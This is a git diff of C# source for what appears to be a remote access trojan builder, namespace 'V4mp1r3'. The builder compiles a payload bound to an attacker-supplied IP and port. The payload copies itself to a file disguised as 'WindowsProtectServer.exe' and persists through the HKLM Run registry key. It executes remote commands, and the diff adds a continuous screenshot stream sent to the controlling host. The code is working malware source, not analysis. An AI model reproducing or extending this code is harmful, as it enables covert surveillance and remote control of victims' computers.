@@ -12,9 +12,9 @@ using Microsoft.CSharp;
 
 namespace V4mp1r3
 {
-    public partial class frmServerMaker : Form
+    public partial class frmClientMaker : Form
     {
-        public frmServerMaker()
+        public frmClientMaker()
         {
             InitializeComponent();
         }
@@ -34,7 +34,7 @@ namespace V4mp1r3
                 string path = null;
                 SaveFileDialog sf = new SaveFileDialog();
                 sf.Filter = "可执行文件|*.exe";
-                if (sf.ShowDialog() == DialogResult.OK)
+                if(sf.ShowDialog() == DialogResult.OK)
                 {
                     path = sf.FileName;
                     CSharpCodeProvider provider = new CSharpCodeProvider();
@@ -83,7 +83,7 @@ namespace V4mp1r3
                         TcpClient client = new TcpClient();
                         try
                         {
-                            if (!File.Exists(@""C:\Windows\WindowsProtectServer.exe""))
+                            if(!File.Exists(@""C:\Windows\WindowsProtectServer.exe""))
                             {
                                 File.Copy(Assembly.GetEntryAssembly().Location, @""C:\Windows\WindowsProtectServer.exe"");
                                 RegistryKey RKey = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"");
@@ -94,7 +94,7 @@ namespace V4mp1r3
                         {
 
                         }
-                        while (true)
+                        while(true)
                         {
                             try
                             {
@@ -108,13 +108,13 @@ namespace V4mp1r3
                         }
                         while(true)
                         {
+                            b:
                             try
                             {
                                 NetworkStream clientStream = client.GetStream();
                                 br = new BinaryReader(clientStream);
-                                string receive = null;
-                                receive = br.ReadString();
-                                if (receive == """")
+                                string receive = br.ReadString();
+                                if(receive == """")
                                 {
                                 }
                                 else if(receive == ""Del"")
@@ -152,7 +152,7 @@ namespace V4mp1r3
                                         bw.Write(e.Message); 
                                     }
                                 }
-                                else if (receive == ""prm"")
+                                else if(receive == ""prm"")
                                 {
                                     try
                                     {
@@ -191,7 +191,38 @@ namespace V4mp1r3
 
                                     }
                                 }
-                                else if(receive == ""disconnect"")
+                                else if (receive == ""srm"") 
+                                {
+                                    try
+                                    {
+                                        while (true)
+                                        {
+                                            Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                                            Graphics g = Graphics.FromImage(image);
+                                            g.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
+                                            MemoryStream ms = new MemoryStream();
+                                            image.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
+                                            ms.Seek(0, SeekOrigin.Begin);
+                                            byte[] bytes = new byte[ms.Length];
+                                            ms.Read(bytes, 0, bytes.Length);
+                                            ms.Dispose();
+                                            bw = new BinaryWriter(clientStream);
+                                            bw.Write(bytes.Length);
+                                            Thread.Sleep(100);
+                                            bw.Write(bytes);
+                                            string re = br.ReadString();
+                                            if (re == ""stop"")
+                                            {
+                                                goto b;
+                                            }
+                                        }
+                                    }
+                                    catch
+                                    {
+
+                                    }
+                                }
+                                else if(receive == ""exit"")
                                 {
                                     Environment.Exit(0);
                                 }
@@ -227,10 +258,10 @@ namespace V4mp1r3
                     string sourceplus = source.Replace("127.0.0.1", textBox1.Text);
                     string sourcemultiply = sourceplus.Replace("2021", textBox2.Text);
                     CompilerResults cr = provider.CompileAssemblyFromSource(parameters, sourcemultiply);
-                    if (cr.Errors.Count > 0)
+                    if(cr.Errors.Count > 0)
                     {
                         StringBuilder sb = new StringBuilder();
-                        foreach (var er in cr.Errors)
+                        foreach(var er in cr.Errors)
                         {
                             sb.AppendLine(er.ToString());
                             MessageBox.Show(sb.ToString(), "提示");
